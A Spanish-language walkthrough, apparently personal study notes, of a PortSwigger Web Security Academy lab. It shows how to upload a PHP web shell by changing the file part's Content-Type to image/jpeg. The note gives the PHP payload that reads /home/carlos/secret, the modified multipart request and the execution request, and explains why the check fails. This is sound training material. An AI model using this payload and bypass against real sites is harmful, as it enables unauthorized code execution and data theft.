# Lab — Web shell upload via Content-Type restriction bypass

> Fuente principal: solución oficial de PortSwigger Web Security Academy.

## Objetivo exacto

Subir un archivo PHP que lea:

```text
/home/carlos/secret
```

pero esta vez superar una validación que intenta permitir solamente imágenes.

## Credenciales

```text
wiener:peter
```

---

# Qué enseña este lab

La aplicación intenta validar el tipo del archivo mediante el `Content-Type` enviado por el cliente.

Eso es débil porque podemos modificarlo en Burp.

```text
exploit.php
Content-Type: application/x-php
        ↓
rechazado

exploit.php
Content-Type: image/jpeg
        ↓
aceptado
```

La extensión sigue siendo `.php`.

---

# Procedimiento oficial paso a paso

## Paso 1 — Login y avatar normal

Iniciar sesión con:

```text
wiener:peter
```

Subir una imagen normal como avatar y volver a la cuenta.

---

## Paso 2 — Encontrar el GET del avatar

Ir a:

```text
Proxy
→ HTTP history
```

Localizar:

```http
GET /files/avatars/<TU-IMAGEN> HTTP/2
```

Clic derecho:

```text
Send to Repeater
```

Dejar esta pestaña abierta. La usaremos después para ejecutar el PHP.

---

## Paso 3 — Crear `exploit.php`

Crear un archivo llamado:

```text
exploit.php
```

con:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

## Paso 4 — Intentar subirlo normalmente

Usar el formulario del avatar y subir `exploit.php`.

La aplicación debería rechazarlo e indicar que solo acepta MIME types como:

```text
image/jpeg
image/png
```

Este rechazo es importante: demuestra qué está validando el servidor.

---

## Paso 5 — Encontrar el POST del upload

Volver a:

```text
Proxy
→ HTTP history
```

Buscar la request:

```http
POST /my-account/avatar
```

que corresponde al intento de subir `exploit.php`.

Clic derecho:

```text
Send to Repeater
```

Ahora tendremos dos pestañas en Repeater:

```text
1. GET /files/avatars/<imagen>
2. POST /my-account/avatar
```

---

## Paso 6 — Entender el multipart

En el body del POST buscar la parte del archivo. Se verá conceptualmente así:

```http
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

No modificar:

```text
filename="exploit.php"
```

No modificar el PHP.

Modificar solamente:

```http
Content-Type: application/x-php
```

por:

```http
Content-Type: image/jpeg
```

---

## Paso 7 — Reenviar el upload

Pulsar:

```text
Send
```

La Response debería indicar que el archivo fue subido correctamente.

Esto confirma que el servidor confía en un dato controlado por el cliente para validar el tipo del archivo.

---

## Paso 8 — Ejecutar `exploit.php`

Cambiar a la otra pestaña de Repeater que contiene el GET del avatar.

Cambiar:

```http
GET /files/avatars/mi-imagen.jpg HTTP/2
```

por:

```http
GET /files/avatars/exploit.php HTTP/2
```

Pulsar:

```text
Send
```

---

## Paso 9 — Leer y enviar el secret

En la Response aparecerá el contenido de:

```text
/home/carlos/secret
```

Copiarlo y usar:

```text
Submit solution
```

---

# Request clave

La parte importante del POST es:

```http
POST /my-account/avatar HTTP/2
Content-Type: multipart/form-data; boundary=...

...
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
...
```

## Ojo con dos `Content-Type` diferentes

En la request puede existir un `Content-Type` general:

```http
Content-Type: multipart/form-data; boundary=...
```

Ese **NO** es el que PortSwigger quiere modificar.

Hay otro `Content-Type` dentro de la parte del archivo:

```http
Content-Type: application/x-php
```

Ese es el que cambiamos por:

```http
Content-Type: image/jpeg
```

---

# Por qué funciona

El servidor está usando un header que controla el cliente como si fuera una prueba fiable del contenido real.

```text
filename = exploit.php
contenido = PHP
MIME declarado = image/jpeg
```

La aplicación mira el MIME y piensa:

```text
"es una imagen"
```

pero el servidor web después mira la extensión `.php` y lo interpreta como PHP.

Hay una discrepancia entre:

```text
validación del upload
vs
procesamiento del archivo almacenado
```

---

# Burp que tengo que aprender

- localizar `POST /my-account/avatar`;
- enviar una request multipart a Repeater;
- leer correctamente límites/boundaries sin romperlos;
- distinguir el `Content-Type` global del `Content-Type` de la parte del archivo;
- modificar solo el MIME del archivo;
- mantener dos pestañas de Repeater para upload y ejecución;
- leer el resultado en la Response.

---

# Errores frecuentes

## Cambiar el Content-Type equivocado

No cambiar:

```http
Content-Type: multipart/form-data; boundary=...
```

Cambiar el que está junto a:

```text
filename="exploit.php"
```

## Cambiar `.php` por `.jpg`

No. En este lab necesitamos conservar:

```text
exploit.php
```

porque queremos que el servidor lo ejecute como PHP.

## Modificar el payload PHP

No es necesario. La vulnerabilidad está en la validación MIME.

---

# Checklist

- [ ] Inicié sesión como `wiener`.
- [ ] Subí imagen normal.
- [ ] Encontré GET `/files/avatars/...` y lo mandé a Repeater.
- [ ] Creé `exploit.php`.
- [ ] Intenté subirlo y observé el rechazo MIME.
- [ ] Encontré `POST /my-account/avatar`.
- [ ] Lo mandé a Repeater.
- [ ] Cambié solo el MIME de la parte del archivo a `image/jpeg`.
- [ ] Confirmé upload exitoso.
- [ ] Pedí `/files/avatars/exploit.php`.
- [ ] Leí el secret.
- [ ] Hice Submit solution.

---

# Regla para recordar

```text
Content-Type declarado por el cliente
≠
prueba confiable del tipo real del archivo
```
